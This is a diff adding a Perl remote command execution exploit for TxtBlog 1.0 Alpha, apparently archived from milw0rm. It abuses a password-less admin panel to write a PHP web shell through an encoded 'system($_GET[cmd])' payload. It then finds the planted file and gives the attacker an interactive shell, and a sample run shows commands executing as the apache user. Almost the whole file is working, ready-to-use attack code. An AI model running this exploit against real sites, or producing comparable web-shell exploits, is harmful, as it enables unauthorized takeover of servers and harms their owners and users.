@@ -1,0 +1,203 @@
+#!/usr/bin/perl
+
+# -----------------------------------------------------------------------------
+#                      INFORMATIONS
+# -----------------------------------------------------------------------------
+
+# App   => TxtBlog v 1.0 Alpha
+# Downl => http://downloads.sourceforge.net/txtblogcms/txtblogcms-1.0a.zip
+
+# Remote Command Execution Exploit
+# by Osirys
+# osirys[at]autistici[dot]org
+# osirys.org
+
+# I wrote this simple RCE exploit, just becouse by default the blog
+# administration password is disabled. So, from admin panel, we can
+# create .php files.
+
+# Tested with: Magic Quotes => Off
+
+# ------------------------------------------------------------------
+# Exploit in action [>!]
+# ------------------------------------------------------------------
+# osirys[~]>$ perl rce_bleah.txt http://localhost/txtblogcms-1.0a/
+
+#   ---------------------------
+#      TxtBlog RCE Exploit
+#            by Osirys
+#   ---------------------------
+
+# [+] Creating RCE file ..
+# [+] RCE Created !
+# [+] File found !
+# [+] Hi my master, do your job now [!]
+
+# shell[localhost]$> id
+# uid=80(apache) gid=80(apache) groups=80(apache)
+# shell[localhost]$> whoami
+# apache
+# shell[localhost]$> exit
+# [-] Quitting ..
+# osirys[~]>
+# ------------------------------------------------------------------
+
+use LWP::UserAgent;
+use IO::Socket;
+use HTTP::Request::Common;
+
+my $adm_path  =  "/admin/index.php";
+my $rce_crea  =  $adm_path."?page=create";
+my $host      =  $ARGV[0];
+
+
+($host) || help("-1");
+cheek($host) == 1 || help("-2");
+&banner;
+
+$datas = get_input($host);
+$datas =~ /(.*) (.*)/;
+($h0st,$path) = ($1,$2);
+
+my $url = $host.$adm_path;
+my $test = get_req($url);
+
+if ($re !~ /Welcome to the administration/) {
+    my $url = $path.$rce_crea;
+    my $code = "title=new+page&blog=%27%3B+%20echo+%22Osirys%3Cbr%3E%22;+system%28%24_GET%5Bcmd%5D%29%3B+%24a+%3D+%27&location=&Submit=Save";
+    my $length = length($code);
+    my $data = "POST ".$url." HTTP/1.1\r\n".
+               "Host: ".$h0st."\r\n".
+               "Keep-Alive: 300\r\n".
+               "Connection: keep-alive\r\n".
+               "Content-Type: application/x-www-form-urlencoded\r\n".
+               "Content-Length: ".$length."\r\n\r\n".
+               $code."\r\n";
+
+    my $socket   =  new IO::Socket::INET(
+                                          PeerAddr => $h0st,
+                                          PeerPort => '80',
+                                          Proto    => 'tcp',
+                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";
+
+    print "[+] Creating RCE file ..\n";
+    $socket->send($data);
+
+    while ((my $e = <$socket>)&&($own != 1)) {
+        if ($e =~ /Your new blog has been saved/) {
+            $own = 1;
+            print "[+] RCE Created ! \n";
+        }
+    }
+    $own == 1 || die "[-] Can't write new file\n";
+
+    $mfile = &find_file;
+    print "[+] Hi my master, do your job now [!]\n\n";
+    &exec_cmd;
+
+}
+else {
+    print "[-] Administration requires password !\n";
+    exit(0);
+}
+
+sub find_file {
+    my $year = (localtime)[5] + 1900;
+    my $month = (localtime)[4];
+    my $day   = (localtime)[3];
+    if ($month =~ /[0-9]{1}/) { $month =~ s/([0-9]{1})/0$1/; }
+    if ($day =~ /[0-9]{1}/) { $day =~ s/([0-9]{1})/0$1/; }
+    for ($i = 0;$i <= 15; $i++) {
+        my $url = $host."/data/".$year."/".$month."/".$day."-".$i.".php";
+        my $re = get_req($url);
+        if ($re =~ /Osirys<br>/) {
+            $g0t = 1;
+            print "[+] File found !\n";
+            $file_path = $url;
+            return($file_path);
+        }
+    }
+    if ($g0t != 1) {
+        print "[-] Can't find evil file !\n";
+        exit(0);
+    }
+}
+
+sub exec_cmd {
+    my @outs;
+    $h0st !~ /www\./ || $h0st =~ s/www\.//;
+    print "shell[$h0st]\$> ";
+    $cmd = <STDIN>;
+    $cmd !~ /exit/ || die "[-] Quitting ..\n";
+    $exec_url = $mfile."?cmd=".$cmd;
+    $re = get_req($exec_url);
+    if ($re =~ /Osirys<br>(.)/) {
+        push(@outs,$re);
+        foreach my $o(@outs) {
+            $o =~ s/Osirys<br>//;
+            print "$o";
+        }
+        &exec_cmd;
+    }
+    else {
+        $c++;
+        $cmd =~ s/\n//;
+        print "bash: ".$cmd.": command not found\n";
+        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
+        &exec_cmd;
+    }
+}
+
+sub get_req() {
+    $link = $_[0];
+    my $req = HTTP::Request->new(GET => $link);
+    my $ua = LWP::UserAgent->new();
+    $ua->timeout(4);
+    my $response = $ua->request($req);
+    return $response->content;
+}
+
+sub cheek() {
+    my $host = $_[0];
+    if ($host =~ /http:\/\/(.*)/) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
+sub get_input() {
+    my $host = $_[0];
+    $host =~ /http:\/\/(.*)/;
+    $s_host = $1;
+    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
+    ($h0st,$path) = ($1,$2);
+    $path =~ s/(.*)/\/$1/;
+    $full_det = $h0st." ".$path;
+    return $full_det;
+}
+
+sub banner {
+    print "\n".
+          "  --------------------------- \n".
+          "     TxtBlog RCE Exploit      \n".
+          "           by Osirys          \n".
+          "  --------------------------- \n\n";
+}
+
+sub help() {
+    my $error = $_[0];
+    if ($error == -1) {
+        &banner;
+        print "\n[-] Bad hostname! \n";
+    }
+    elsif ($error == -2) {
+        &banner;
+        print "\n[-] Bad hostname address !\n";
+    }
+    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
+    exit(0);
+}
+
+# milw0rm.com [2009-02-03]
